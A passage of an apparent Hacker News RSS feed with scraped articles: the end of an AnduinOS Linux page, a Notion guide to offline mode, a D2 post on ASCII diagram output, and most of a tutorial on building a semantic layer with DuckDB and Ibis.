                            <a href="https://www.zdnet.com/article/this-windows-11-like-linux-distribution-is-aimed-squarely-at-developers/" target="_blank">ZDNet</a>
                        </h4>
                        <p>In fact, this is one of those "set-it-and-forget-it" distributions that makes using Linux a delight. It's intuitive, simple to use, and well-designed.</p>
                    </div>
            <div>
                        <h4>
                            <a href="https://betanews.com/2025/05/01/say-no-thanks-microsoft-windows-11-and-yes-please-to-anduinos-1-3/" target="_blank">BetaNews</a>
                        </h4>
                        <p>The OS continues to focus on ease of use, especially for those users moving over from Windows.</p>
                    </div>
            <div>
                        <h4>
                            <a href="https://www.neowin.net/news/the-sole-maintainer-of-linux-distribution-anduinos-turns-out-to-be-a-microsoft-employee/" target="_blank">Neowin</a>
                        </h4>
                        <p>Linux stands as a good option to keep computers running, and if you want something that looks similar to Windows, then AnduinOS is worth checking out.</p>
                    </div>
        </div>

<div>
        <div>
            <p><span>FAQ</span></p><h2>Frequently asked questions</h2>
            <p>Here are some of the answers you might be looking for.</p>
        </div>

        <div id="accordionFaq">
                    <div id="collapseZero" aria-labelledby="faqOne" data-bs-parent="#accordionFaq">
                            <p>
                                Yes, AnduinOS is free to use. It is an open-source project that follows the GPL-v3 license. You can view the source code, modify it, and redistribute it. It's free and will always be free.
                            </p>
                        </div>
                    <div id="collapseOne" aria-labelledby="faqOne" data-bs-parent="#accordionFaq"><p>
                                AnduinOS is based on Ubuntu's package base. Any software that runs on Ubuntu that can run on AnduinOS. You can run a variety of applications, including but not limited to: Linux apps, web apps, and even Windows apps using Wine.
                                </p><p>
                                AnduinOS uses Flatpak to manage graphical applications. Flatpak is a software utility for software deployment, application virtualization, and package management. It allows you to run applications in a sandboxed environment, which can help improve security and stability.
                            </p></div>
                    <div id="collapseTwo" aria-labelledby="faqTwo" data-bs-parent="#accordionFaq">
                            <p>
                                On Ask Ubuntu, you can search for and ask about very common issues. Solutions for almost all AnduinOS issues are identical to those for Ubuntu. You can rely entirely on Ubuntu's documentation and expertise to resolve problems with AnduinOS.
                            </p>
                        </div>
                    <div id="collapseThree" aria-labelledby="faqThree" data-bs-parent="#accordionFaq">
                            <p>
                                You have access to AnduinOS online support services via GitHub Discussions. Please contact us at <a href="https://github.com/Anduin2017/AnduinOS/discussions">here</a>
                                for any questions.
                            </p>
                        </div>
                    <div id="collapseWho" aria-labelledby="faqOne" data-bs-parent="#accordionFaq"><p>
                                AnduinOS is a non-profit project built in spare time, sustained solely through donations, and is not backed by any corporation or national government.
                                <a href="https://news.anduinos.com/post/2025/5/6/story-behind-anduinos-a-letter-from-anduin" target="_blank">Read more</a>.
                                </p><p>
                                AnduinOS is funded by user donations. We are grateful for your support. And you can <a href="https://www.paypal.com/paypalme/anduinxue2017" target="_blank">donate</a>
                                to us via PayPal.
                            </p></div>
                    
                </div>
    </div>








    










</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Notion releases offline mode (215 pts)]]></title>
            <link>https://www.notion.com/help/guides/working-offline-in-notion-everything-you-need-to-know</link>
            <guid>44954665</guid>
            <pubDate>Tue, 19 Aug 2025 18:27:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.notion.com/help/guides/working-offline-in-notion-everything-you-need-to-know">https://www.notion.com/help/guides/working-offline-in-notion-everything-you-need-to-know</a>, See on <a href="https://news.ycombinator.com/item?id=44954665">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><div><p><span>In this guide</span></p><ul><li><span><span>How to use Notion offline</span></span></li><li><span><span>Get ready to go offline with Notion</span></span></li><li><span><span>Before going offline</span></span></li><li><span><span>Working offline effectively</span></span></li></ul></div><hr><article><p>Ever tried to dive into work, only to realize you’re offline? Maybe you’re on a flight, off the grid, or stuck in a dead zone right when inspiration hits.</p><p>With Notion’s offline mode, you can keep your workflow uninterrupted, your content protected, and your work accessible from anywhere, no signal required. Because even if the internet drops, your momentum doesn’t have to.</p><p>In this guide, we’ll cover:</p><div><ul><li><p>How to prepare Notion for offline work</p></li><li><p>Tips to follow before going offline</p></li><li><p>Key differences to keep in mind while offline</p></li></ul></div><p>All Notion users can view, edit, and create pages offline on the desktop or mobile app. Anyone can download individual pages they need to use offline. On the Plus, Business, and Enterprise plans, Notion also automatically downloads your recent and favorited pages, so they're ready when you need them.</p><p>To get started, open any page, tap the <code>•••</code> menu in the top‑right corner, and turn on <code>Available offline</code>. You'll see a progress bar while your page downloads.</p><div role="button" aria-label="Open lightbox"><figure><figcaption><p>Open any page, tap the ••• menu in the top-right corner, and turn on Available offline to get started.</p></figcaption></figure></div> <p>Any changes you make offline will save locally and sync automatically the next time your device connects to the internet. To see which pages are saved offline open the <code>Offline tab</code> in your <code>Settings</code>. From there, you see pages downloaded by you or Notion. You can also remove pages from offline access right from this tab.</p><div><p><img alt="" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" srcset="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=96&amp;q=75 1x, https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75 2x" src="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75"></p><div><p>Remember to mark your pages as offline across your devices</p></div></div><p>Even without internet, you can keep your work moving. A little preparation (and a few best practices) will keep Notion running smoothly wherever you are. Here’s how: </p><div><p><h3 id="before-going-offline"><strong>Before going offline</strong></h3></p></div><div><ul><li><p><strong>Mark pages for offline use on each device—</strong> Enable <code>Available offline </code>for pages you plan to work on, since offline access is device-specific.</p></li><li><p><strong>Confirm downloads— </strong>You<strong> </strong>can check the <code>Offline </code>tab in <code>Settings </code>to see which pages you’ve already downloaded.</p><div role="button" aria-label="Open lightbox"><figure><figcaption><p>Go to Settings → Offline to view, search, and organize all your offline pages in one place.          Ask ChatGPT</p></figcaption></figure></div> </li><li><p><strong>Download specific rows from your database—</strong> When you download a database, the first 50 rows download </p><p>automatically. To ensure additional rows are available, individually download them for offline use.</p><div><p><img alt="" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" srcset="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=96&amp;q=75 1x, https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75 2x" src="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75"></p></div></li><li><p><strong>Mark sub-pages individually—</strong> If you have a top-level (parent) page with many sub-pages, be sure to mark each one you need for offline access.</p></li></ul></div><div><p><img alt="" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" srcset="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=96&amp;q=75 1x, https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75 2x" src="https://www.notion.com/_next/image?url=%2Ffront-static%2Fshared%2Fcallouts%2Ftip-illustration-v4.png&amp;w=128&amp;q=75"></p><div><p>I don’t want to have to download my pages manually. Is there any other way?</p></div></div><div><ul><li><p><strong>Plan ahead for sharing or updates—</strong> You won’t be able to share pages or change permissions while offline, so make any updates before you disconnect or once you’re back online.</p></li></ul></div><div><p><h3 id="working-offline-effectively"><strong>Working offline effectively</strong></h3></p></div><p>Think of offline time as your secret weapon for focus—no pings, no tabs, just you and your work. Here’s how you can make it count:</p><div><ul><li><p><strong>Dive into deep work— </strong>Use offline time for writing, planning, or reviewing (the kind of tasks that thrive without distraction!)</p></li><li><p><strong>Collaborate seamlessly when offline— </strong>Notion updates your changes alongside others’ when you reconnect. Text merges happen automatically, with non-text changes (like images) sometimes needing a quick review.</p></li><li><p><strong>Work within the limits— </strong>Most blocks can be viewed and edited offline, but elements that require a live connection, such as embeds, forms, or buttons, will be unavailable.</p></li><li><p><strong>Sync up regularly— </strong>Reconnect when you can to upload changes and refresh your content.</p></li><li><p><strong>Search shows what’s ready to use—</strong> Offline pages appear first, while unavailable ones are greyed out, helping you quickly focus on what you can work on right now.</p></li></ul></div><p>Your updates save seamlessly once you’re back online, even if others edited the page at the same time. The sync status indicator confirms everything is up to date.</p><div role="button" aria-label="Open lightbox"><figure><figcaption><p>When back online, check the sync indicator to confirm changes are saved—most text edits merge automatically.</p></figcaption></figure></div> <p>Offline doesn’t have to mean <i>on hold</i>. By marking your key pages, knowing what works without a connection, and following a few best practices, you’ll be ready to work seamlessly (online or off!) And when you reconnect, everything syncs seamlessly so you can pick up right where you left off.</p></article></section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[D2 (text to diagram tool) now supports ASCII renders (321 pts)]]></title>
            <link>https://d2lang.com/blog/ascii/</link>
            <guid>44954524</guid>
            <pubDate>Tue, 19 Aug 2025 18:14:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://d2lang.com/blog/ascii/">https://d2lang.com/blog/ascii/</a>, See on <a href="https://news.ycombinator.com/item?id=44954524">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__blog-post-container"><p>In the latest release of D2 (0.7.1), we introduce ASCII outputs.</p>
<p>Any output file with extension <code>txt</code> will use the ASCII renderer to write to it.</p>
<!-- -->
<p>Here is an example of their rendering from the <a href="https://github.com/terrastruct/d2-vim" target="_blank" rel="noopener noreferrer">D2 Vim extension</a>. The user opens a <code>.d2</code> file and opens a preview window, which updates upon every save.</p>
<p><img decoding="async" loading="lazy" alt="D2 Vim preview" src="https://d2lang.com/assets/images/preview-d04cd1ad32fec06203b93a3ac64d903f.gif" width="1159" height="1470"></p>
<h2 id="code-documentation">Code documentation<a href="#code-documentation" aria-label="Direct link to Code documentation" title="Direct link to Code documentation">​</a></h2>
<p>Perhaps the most useful place for ASCII diagrams is in the source code comments. Small
simple diagrams next to functions or classes can serve to be much clearer than describing
a flow.</p>
<p>Here again the Vim extension demonstrates a functionality to write some d2 code and
replace the selection with the ASCII render.</p>
<p><img decoding="async" loading="lazy" alt="D2 Vim replace" src="https://d2lang.com/assets/images/replace-7658a2addaa42da73547218f1cffe1d5.gif" width="1159" height="1470"></p>
<h2 id="unicode-and-standard-ascii">Unicode and standard ASCII<a href="#unicode-and-standard-ascii" aria-label="Direct link to Unicode and standard ASCII" title="Direct link to Unicode and standard ASCII">​</a></h2>
<p>The default character set of ASCII renders is unicode, which has nicer box-drawing
characters. If you'd like true ASCII for maximum portability, you can specify this with
the flag <code>--ascii-mode=standard</code>.</p>
<h2 id="limitations">Limitations<a href="#limitations" aria-label="Direct link to Limitations" title="Direct link to Limitations">​</a></h2>
<div><p><span><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Alpha</p><p>Note that the ASCII renderer should be considered in alpha stage. There will be many
corner cases, areas of improvements, and outright bugs. If you enjoy using it, we'd
appreciate you taking the time to file any issues you run into:
<a href="https://github.com/terrastruct/d2/issues" target="_blank" rel="noopener noreferrer">https://github.com/terrastruct/d2/issues</a>.</p></div>
<p>The ASCII renderer is a downscale of the layout determined by the ELK layout engine with
some post-processing to further compact it.</p>
<ul>
<li>No styles are supported<!-- -->
<ul>
<li>Some will never be, e.g. <code>animated</code> and <code>font</code> don't make sense in ASCII.</li>
<li>Some may in the future with limited scope, e.g. colors when rendered to terminal.<!-- -->
<ul>
<li>By extension, themes are moot</li>
</ul>
</li>
<li>Some should be considered TODOs, e.g. <code>double-border</code> and <code>multiple</code></li>
</ul>
</li>
<li>Uneven spacing<!-- -->
<ul>
<li>Sometimes the downscaling results in a box with uneven spacing, e.g. a rectangle with
width 5 and the label is 2 chars. Due to discrete coordinate space in ASCII renders, some
outputs may look less even than their SVG counterparts.</li>
</ul>
</li>
</ul>
<h2 id="try-it-yourself">Try it yourself<a href="#try-it-yourself" aria-label="Direct link to Try it yourself" title="Direct link to Try it yourself">​</a></h2>
<p>This is live now in the D2 Playground. Try opening the below code block (click top right
of it).</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why Semantic Layers Matter (and how to build one with DuckDB) (133 pts)]]></title>
            <link>https://motherduck.com/blog/semantic-layer-duckdb-tutorial/</link>
            <guid>44953575</guid>
            <pubDate>Tue, 19 Aug 2025 16:49:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://motherduck.com/blog/semantic-layer-duckdb-tutorial/">https://motherduck.com/blog/semantic-layer-duckdb-tutorial/</a>, See on <a href="https://news.ycombinator.com/item?id=44953575">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Many ask themselves, "Why would I use a semantic layer? What is it anyway?" In this hands-on guide, we’ll build the simplest possible semantic layer using just a YAML file and a Python script—not as the goal itself, but as a way to understand the value of semantic layers. We’ll then query 20 million NYC taxi records with consistent business metrics executed using DuckDB and Ibis. By the end, you’ll know exactly when a semantic layer solves real problems and when it’s overkill.</p>
<p>It's a topic that I'm passionate about as I've been using semantic layers within a Business Intelligence (BI) tool for over twenty years, and only recently have we gotten full-blown semantic layers that can sit outside of a BI tool, combining the advantages of a logical layer with sharing them across your web apps, notebooks, and BI tools. With a semantic layer, your revenue KPI or other complex company measures are defined once in a single source of truth—no need to re-implement them over and over again.</p>
<p>We'll have a look at the simplest possible semantic layer, which uses a simple YAML file (for the semantics) and a Python script for executing it with Ibis and DuckDB. We'll do a quick recap of the semantic layer before diving into a practical code example.</p>
<p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: Find the Code on GitHub</span></span>
For all the examples shown in this article, find the code on the GitHub repository <a href="https://github.com/sspaeti/semantic-layer-duckdb">semantic-layer-duckdb</a>.
</span></p><section><h2 id="when-you-dont-need-a-semantic-layer">When You Don't Need a Semantic Layer</h2><p>Let's start by exploring when you don't need a semantic layer and when it's the wrong choice. The simplest and most straightforward reasons are:</p><ul>
<li>You're just getting started with analytics and only have one consumer, meaning you only have one way of showcasing analytics data, for example, a BI tool, notebooks, or a web app, but not multiple ways of presenting data. This means you don't apply calculated logic in different places.</li>
<li>You don't have extensive business logic that you query ad hoc; you have simple counts, SUMs, or averages.</li>
<li>You preprocess all your metrics as SQL transformations into physical tables, meaning your downstream analytics tools get all metrics preprocessed and aggregated, and filtering is fast enough.</li>
</ul></section>
<section><h2 id="why-use-a-semantic-layer">Why Use a Semantic Layer?</h2><p>So when do we actually need one, and what is it? There's a lot of information out there, including from myself about the <a href="https://www.ssp.sh/blog/rise-of-semantic-layer-metrics/">history and rise [2022]</a>, comparing it to an <a href="https://cube.dev/blog/exploring-the-semantic-layer-through-the-lens-of-mvc">MVC-like approach</a>, or explaining its <a href="https://cube.dev/blog/universal-semantic-layer-capabilities-integrations-and-enterprise-benefits">capabilities</a>. That's why in this article I focus on the <em>why</em> and showcase how to use it in a practical example in the next chapter.</p><p>The main reasons for using a semantic layer may be one or more of the following needs:</p><ol>
<li><strong>Unified place</strong> to define ad hoc queries once, version-controlled and collaboratively, with the possibility of pulling them into different BI tools, web apps, notebooks, or AI/MCP integration. Avoid <strong>duplication</strong> of metrics in every tool, making <strong>maintainability</strong> and data governance much easier; resulting in a <strong>consistent business layer</strong> with encapsulated business logic.</li>
</ol><p><em><strong>Example</strong></em>: Most organizations quickly run multiple BI tools simultaneously with additional Excel or Google Sheets. Instead of maintaining separate calculated fields and business logic in each tool in a proprietary format, semantic layers provide one definition that works across all platforms.</p><ol start="2">
<li><strong>Caching</strong> is needed for ad hoc queries that are based on various source databases. Defining the metrics that enable pre-calculations for sub-second query responses can benefit any downstream analytics tools compared to implementing custom database connections and different databases. Eliminating potential <strong>data movement costs</strong> by querying data where it lives, using dialect-optimized SQL pushdown across heterogeneous sources. This reduces infrastructure overhead and cloud computing costs.</li>
</ol><p><em><strong>Example</strong></em>: For a non-production or high-load OLTP source, the semantic layer can directly query the various data sources (e.g., IoT data, logs, and other data) instead of moving them into a data lake or data warehouse, and through the cache of the semantic layer, it's fast enough without data movement.</p><ol start="3">
<li>Unified <strong>access-level security</strong> through <strong>various APIs</strong> (REST, GraphQL, SQL, ODBC/JDBC, MDX/Excel) as well. Unified Analytics API enables self-serve BI by allowing users to connect Excel to a cleaned, fast, and unified API.</li>
</ol><p><em><strong>Example</strong></em>: Centralized row-level and column-level security that works consistently across all downstream analytics tools, rather than trying to manage access controls separately in each BI tool or analytics tool that has access to the data. Users can connect directly with Excel and have the correct permissions and calculated business metrics out of the box.</p><ol start="4">
<li><strong>Dynamic query rewriting</strong> automatically translates simple, business-friendly queries into complex, optimized SQL across multiple databases. This enables users to write intuitive queries using business concepts (like "average_order_value") without needing to know the underlying data model complexity, table relationships, or database-specific syntax. The semantic layer <strong>abstracts</strong> complex analytics, such as ratios at different grains, time ranges (YoY, trailing periods), and custom calendars, into simple semantic queries.</li>
</ol><p><em><strong>Example</strong></em>: Complex analytics simplified by handling sophisticated calculations that are painful in raw SQL: ratios at different grains (like per-member-per-month in insurance), time intelligence (year-over-date, trailing 12 months, period-over-period), and custom calendar logic. These become simple semantic queries rather than complex subqueries with distinct counts.</p><ol start="5">
<li>Context for LLMs to improve accuracy and natural language querying can be significantly enhanced with a semantic layer, which provides business context and prevents AI from hallucinating frequently, as most of the business logic is configured and defined in a semantic layer, sometimes even data models, to help LLMs further understand the business.</li>
</ol><p><em><strong>Example</strong></em>: Internal Large Language Models (LLMs) or Retrieval-Augmented Generation (RAG) systems need business context to understand the business. A semantic layer's connection of dimensions and facts, along with metric definitions, can help the model understand and suggest better SQL queries or responses through natural language.</p><hr><p>More broadly, semantic layers bridge the gap between business needs and data source integration in a very organized and governed way. They are best optimized for larger enterprises with numerous scattered KPIs that can afford to add another layer to their data stack. However, the example below uses the simplest and smallest semantic layer, even with little data.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>EXAMPLE<!-- -->: If you want to know more</span></span>
Brian Bickell gave a great talk at the Practical Data Community about semantic layers and the problem they solve. I highly recommend checking that out too at <a href="https://youtu.be/kcctcQhlxOw?si=hdRHLFlWY11bYNgl&amp;t=1119">Semantic Layer Deep Dive</a>. If you're already on the Practical Data show from Joe Reis, also check out Hamilton Ulmer's presentation about <a href="https://www.youtube.com/watch?v=EOpkSsSDv40&amp;t=2457s">Instant SQL with DuckDB/MotherDuck</a>, not entirely about semantic layers, but related to the history of SQL and CTEs and how instant SQL can help.
</span><section><h3 id="datasets-vs-aggregations">Datasets vs. Aggregations</h3><p>An important distinction is whether we need <strong>persistent</strong> datasets or we want <strong>ad hoc</strong> queries. These are typically very different. Ad hoc queries must be flexible and change granularity based on added dimensions. This means someone running a query might switch from a daily view to a weekly or monthly one, add a region, and then decide to roll it up to a country level; all of this can happen in a couple of seconds. Therefore, there is no time to refresh or process the data.</p><p>Calculated measures need to be added on the fly, without requiring an ETL job to be reprocessed. A common workaround is to create multiple persistent physical datasets with dbt, each containing the same data but with varying granularity, allowing for the display of different charts in the BI tool with different focuses. A semantic layer, or ad hoc queries, does that on the fly.</p><p>We can differentiate and say:</p><ul>
<li>dataset ≠ aggregations</li>
<li>table columns ≠ metrics</li>
<li>physical table ≠ logical definition</li>
</ul><p>If you find yourself needing the concepts on the right side, that's when you need a semantic layer—whether built into a BI tool or implemented separately for the reasons mentioned above.</p></section></section>
<section><h2 id="how-a-semantic-layer-works-a-practical-example">How a Semantic Layer Works: A Practical Example</h2><p>Now let's see this in action by analyzing the most pragmatic semantic layer there is. The simplest semantic layer I found is by Julien Hurault, who recently announced the release of the <a href="https://github.com/boringdata/boring-semantic-layer">Boring Semantic Layer (BSL)</a> project. We use DuckDB as the query engine and Python with <a href="https://github.com/ibis-project/ibis">Ibis</a> for the execution layer.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: What this Semantic Layer does not have</span></span>
This is a relatively simple semantic layer. More advanced ones include additional features such as multiple robust APIs (REST, GraphQL, SQL, ODBC, Excel), advanced security controls, and a powerful caching layer.
This example focuses on the <a href="https://en.wikipedia.org/wiki/Logical_schema">Logical Data Model</a>, where we can define our business requirements within YAML, an abstraction above our physical layer. Although this is quite close to the physical layer, this is where more advanced semantic layer tools (Cube, dbt SL, GoodData, AtScale) give you more advantages in an enterprise setting.
</span><p>We're going to build something like what's illustrated below—where we have YAML definitions as our metrics, such as calculated measures and dimensions, and Ibis for the query translation to run <a href="https://github.com/ibis-project/ibis#how-it-works">any execution engine</a>; here we use DuckDB.</p><img alt="img1" loading="lazy" decoding="async" data-nimg="fill" sizes="90vw,
                        (min-width: 728px) 800px,
                        (min-width: 960px) 950px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=3840&amp;q=75"><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 1.5C6.71442 1.5 5.45772 1.88122 4.3888 2.59545C3.31988 3.30968 2.48676 4.32484 1.99479 5.51256C1.50282 6.70028 1.37409 8.00721 1.6249 9.26809C1.8757 10.529 2.49477 11.6872 3.40381 12.5962C4.31285 13.5052 5.47104 14.1243 6.73192 14.3751C7.99279 14.6259 9.29973 14.4972 10.4874 14.0052C11.6752 13.5132 12.6903 12.6801 13.4046 11.6112C14.1188 10.5423 14.5 9.28558 14.5 8C14.4982 6.27665 13.8128 4.62441 12.5942 3.40582C11.3756 2.18722 9.72335 1.50182 8 1.5ZM8 13.5C6.91221 13.5 5.84884 13.1774 4.94437 12.5731C4.0399 11.9687 3.33495 11.1098 2.91867 